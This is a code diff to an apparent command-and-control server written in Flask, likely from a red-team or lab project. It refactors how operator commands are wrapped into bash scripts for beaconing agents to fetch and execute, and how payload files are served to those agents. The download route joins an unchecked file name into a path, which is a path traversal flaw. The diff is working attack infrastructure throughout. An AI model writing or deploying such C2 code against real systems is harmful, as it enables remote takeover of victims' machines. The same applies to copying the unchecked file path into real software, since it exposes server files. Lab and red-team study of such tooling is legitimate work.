@@ -26,6 +26,15 @@ def encode_base64(data):
     return str(base64.b64encode(json.dumps(data).encode()), "utf-8")
 
 
+def read_template_file(filename):
+    template_dir = "./c2server/payloads/template_payloads"
+    template_path = f"{template_dir}/{filename}"
+    with open(template_path, "r") as file:
+        template_content = file.read()
+    template = Template(template_content)
+    return template
+
+
 # Agent check-in
 @app.route("/beacon", methods=["POST"])
 def beacon():
@@ -110,16 +119,9 @@ def send_command():
         if agent not in agents:
             return jsonify({"error": "Agent not found"}), 404
 
-        executor_script_template = Template(
-            """#!/bin/bash
-                $command
-            """
-        )
-
-        executor_script_content = executor_script_template.substitute(command=command)
-        executor_script_path = (
-            f"/attacker/c2server/payloads/dynamic_payloads/exec_script.sh"
-        )
+        exec_template = read_template_file("Exec_Bash_Template.sh")
+        executor_script_content = exec_template.safe_substitute(command=command)
+        executor_script_path = f"./c2server/payloads/dynamic_payloads/exec_script.sh"
 
         with open(executor_script_path, "w") as temp_script:
             temp_script.write(executor_script_content)
@@ -176,13 +178,12 @@ def download():
         if not file_name:
             return jsonify({"error": "Missing file name"}), 400
 
-        file_path = f"/attacker/c2server/payloads/{file_name}"
+        file_path = f"./c2server/payloads/{file_name}"
         if not os.path.exists(file_path):
-            file_path = f"/attacker/c2server/payloads/dynamic_payloads/{file_name}"
+            file_path = f"./c2server/payloads/dynamic_payloads/{file_name}"
         with open(file_path, "rb") as f:
             file_data = f.read()
 
-        print("[DEBUG] File name:", file_name)
         headers = {
             "Content-Disposition": f'attachment; filename="{file_name}"',
             "FILENAME": file_name,
